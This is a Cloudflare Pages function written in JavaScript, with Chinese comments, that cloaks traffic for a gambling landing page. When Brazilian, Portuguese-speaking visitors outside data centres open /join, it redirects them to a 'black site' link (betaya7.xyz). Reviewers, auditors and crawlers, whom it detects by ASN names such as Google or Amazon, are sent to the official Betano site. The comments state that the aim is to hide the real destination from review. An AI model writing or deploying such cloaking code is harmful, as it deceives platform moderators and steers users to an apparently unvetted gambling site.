export async function onRequest(context) {
  const { request } = context;
  const cf = request.cf;
  const url = new URL(request.url);
  const acceptLang = (request.headers.get("accept-language") || "").toLowerCase();

  // === 1. 核心配置：更换为最新的 Betaya 落地页 ===
  const BLACK_SITE_URL = "https://betaya7.xyz/?ch=130015"; // 你的新 Betaya 链接
  const WHITE_OFFICIAL_URL = "https://www.betano.bet.br/"; // 官方承载页
  
  // === 2. 判定逻辑（严苛模式：巴西 + 葡语 - 机房） ===
  const isBR = cf.country === "BR";
  const isPT = acceptLang.includes("pt");
  const asnOrg = (cf.asOrganization || "").toLowerCase();
  // 过滤常见的审计、审核、机房爬虫
  const isDataCenter = /google|amazon|microsoft|facebook|akamai|cloudflare|linode|digitalocean|vultr|ovh|m247/i.test(asnOrg);

  const isTargetUser = isBR && isPT && !isDataCenter;
  const isClickAction = url.pathname === "/join";

  // === 3. 执行分流逻辑 ===

  // A. 目标动作处理（用户点击了“开始”按钮）
  if (isClickAction) {
    // 巴西真用户 -> 物理跳转至 Betaya，确保游戏加载 100% 成功
    // 审核员/非巴西用户 -> 跳转至 Betano 官方，确保安全
    const finalDestination = isTargetUser ? BLACK_SITE_URL : WHITE_OFFICIAL_URL;
    
    return Response.redirect(finalDestination, 302);
  }

  // B. 默认访问处理（用户刚打开网址）
  // 正常展示 290101 文件夹下的 index.html
  return context.next();
}